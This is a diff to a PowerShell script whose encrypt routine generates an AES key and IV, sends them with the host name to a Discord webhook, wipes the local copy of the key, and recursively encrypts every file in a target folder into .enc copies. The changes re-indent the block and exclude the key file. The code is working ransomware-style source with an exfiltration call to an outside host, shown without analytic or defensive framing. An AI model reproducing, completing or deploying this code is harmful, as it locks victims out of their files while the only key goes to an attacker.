@@ -48,22 +48,23 @@ function E-D {
     $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
 
     if ($e) {
-        $aes.GenerateKey()
-        $aes.GenerateIV()
-        $key = $aes.Key
-        $iv = $aes.IV
+		$aes.GenerateKey()
+		$aes.GenerateIV()
+		$key = $aes.Key
+		$iv = $aes.IV
 
-        $passwordText = [Convert]::ToBase64String($key) + "|" + [Convert]::ToBase64String($iv)
-        Set-Content -Path "$p\key.txt" -Value $passwordText
+		$passwordText = [Convert]::ToBase64String($key) + "|" + [Convert]::ToBase64String($iv)
+		Set-Content -Path "$p\key.txt" -Value $passwordText
 
-        SendToDiscord $wh $passwordText $hostname
+		SendToDiscord $wh $passwordText $hostname
 
-        Clear-Content "$p\key.txt"
+		Clear-Content "$p\key.txt"
 
-        Get-ChildItem -Path $p -Recurse -File | ForEach-Object {
-            EncryptFile $_.FullName ($_.FullName + ".enc") $aes
-        }
-    }
+		Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne "key.txt" } | ForEach-Object {
+			EncryptFile $_.FullName ($_.FullName + ".enc") $aes
+		}
+	}
+
 
     if ($d) {
         $keyPath = "$p\key.txt"
